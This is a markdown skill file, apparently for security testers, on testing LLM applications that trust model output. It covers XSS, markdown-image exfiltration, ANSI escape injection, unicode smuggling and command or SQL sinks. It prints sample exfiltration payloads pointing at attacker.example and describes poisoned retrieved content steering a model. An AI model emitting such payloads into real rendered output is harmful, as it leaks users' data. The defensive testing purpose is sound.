---
name: testing-llm-insecure-output-handling
description: >-
  Test what happens after the model speaks: whether an application trusts model
  output and passes it, unescaped, into a browser, a terminal, a shell, a database,
  or another system. Covers model-driven XSS and markup injection, data
  exfiltration through rendered markdown images and links, terminal and ANSI escape
  injection, invisible-unicode and ascii smuggling in output, and output used to
  build code, SQL, or shell commands. Use when reviewing any app that renders,
  executes, or forwards LLM output. The model's output is an untrusted string.
license: MIT
---

# Testing LLM insecure output handling: the output is the other half

Most LLM security attention is on the input. The output is the other half. An
application that treats model output as safe and renders or executes it inherits an
injection primitive, because the model can be steered (by a user or by poisoned
content) into emitting exactly the payload the downstream sink will trust. The model
becomes a confused deputy that writes the attacker's markup, escape sequence, or
query, and the app runs it.

## When to use

- The app renders model output as HTML or markdown in a browser.
- The output is printed to a terminal, written to logs, or shown in a CLI agent.
- Model output is concatenated into a shell command, a SQL query, a file path, or
  code that gets executed.
- Output is forwarded to another tool, agent, or stored and later displayed.

## Scope check

Test outputs and sinks you own or are authorized to test. Use benign canary payloads
and observe your own instrumentation; never exfiltrate real data. If you can't name
the authorization, stop.

## The loop

1. **Trace every sink model output flows into.** Follow the output from the model to
   where it lands: rendered as HTML or markdown, printed to a terminal, concatenated
   into a shell command or SQL, written to a file or log, fed to another tool or
   agent, stored and later displayed. Each is a sink that may trust the text.

2. **Classify each sink's escaping.** For each, ask what the sink executes and
   whether output is neutralized before it arrives: is HTML escaped, is markdown
   sanitized, are terminal escapes stripped, is the query parameterized, is the
   value quoted. An unescaped sink is where model output becomes code.

3. **Test browser sinks.** If output renders as HTML or markdown, get the model to
   emit a script or event-handler payload, or an image or link whose URL carries
   data, for example `![](https://attacker.example/?d=SECRET)`. A rendered image with
   an attacker URL exfiltrates whatever the model puts in the query string, with no
   click. Markdown links and raw HTML both apply.

4. **Test terminal sinks.** If output prints to a terminal (a CLI agent, a log
   viewer), can the model emit ANSI escape sequences that rewrite the display, hide
   text, spoof a prompt, or, on vulnerable terminals, alter the title or clipboard?
   Terminal escapes in unsanitized output are a manipulation and spoofing channel.

5. **Test invisible and smuggled output.** Can the model emit zero-width characters,
   homoglyphs, or bidirectional controls that hide content inside benign-looking
   output, smuggling instructions to a downstream agent or hiding a payload from a
   human reviewer? Ascii and unicode smuggling in output is how a payload survives a
   human read.

6. **Test code, command, and query sinks.** If output builds a shell command, SQL, a
   path, or code that executes, treat the model as an untrusted string source: does
   injected syntax reach the interpreter? Model-authored input to an interpreter is
   injection with the model as the author.

7. **Rate and record.** Severity follows the sink: script execution in a victim's
   session or exfiltration through an image URL is high or critical; a spoofed
   terminal line is medium. Record confirmed unsafe sinks and sinks that escape or
   parameterize output (killed) in the schema.

## Why the output side gets missed

- **Teams trust their own model's output** the way they would never trust user
  input. It is the same untrusted string.
- **The model can be driven to emit any payload**, so "it usually outputs prose" is
  not a boundary.
- **Rendered markdown is code.** An image tag is an outbound request; a link is a
  navigation. Both move data.
- **A human reviewing output can be fooled** by invisible characters the downstream
  sink still executes.

## Worked example (a confirm and a kill)

> **Confirm.** A chat UI renders assistant markdown directly. Poisoned retrieved
> content steers the model to output `![x](https://attacker.example/log?d=<the user's
> session summary>)`. The browser fetches the image on render, sending the summary to
> the attacker. No click. **Confirmed** markdown-image exfiltration, `high`,
> remediation = disallow external image loading in rendered output or proxy and strip
> URLs, sanitize markdown, apply a content policy.
>
> **Kill.** A CLI tool prints model output through a function that strips ANSI and
> control characters and renders only plain text, and never passes output to a shell.
> An emitted escape sequence and an emitted command-substitution string both appear as
> literal, inert characters. **Killed**, `kill_reason` = "output is
> control-character-stripped and rendered as plain text; never reaches a shell,
> browser, or query interpreter."

## Rationalizations to reject

- *"It's our model's output, it's safe."* → It is an untrusted string the model can
  be steered to control. Escape it at the sink.
- *"We sanitize the user's input."* → Irrelevant to the output sink. Sanitize what
  the model emits, where it lands.
- *"It's just markdown."* → Markdown renders images and links, and both are outbound
  requests. That is exfiltration.
- *"The terminal just prints text."* → Not if it interprets ANSI. Strip control
  sequences before display.

## Executing this in practice

You need to enumerate every sink model output reaches, control (via input or poisoned
content) what the model emits, and observe whether the sink executes it: a rendered
script, an outbound image request, a terminal redraw, an interpreted command. Any
harness where you can shape output and watch the sink works; the sink inventory and
the per-sink escaping check are the method.

## Related

- `testing-agents-for-indirect-prompt-injection` - the input side that steers what
  the model emits.
- `auditing-the-lethal-trifecta` - a rendered image or link URL is an egress leg.
- `adjudicating-taint-paths` - model output is a taint source into the downstream
  sink.
- [FINDING-SCHEMA.md](../../FINDING-SCHEMA.md) - source = the model output, sink =
  the browser, terminal, shell, or query that trusts it.
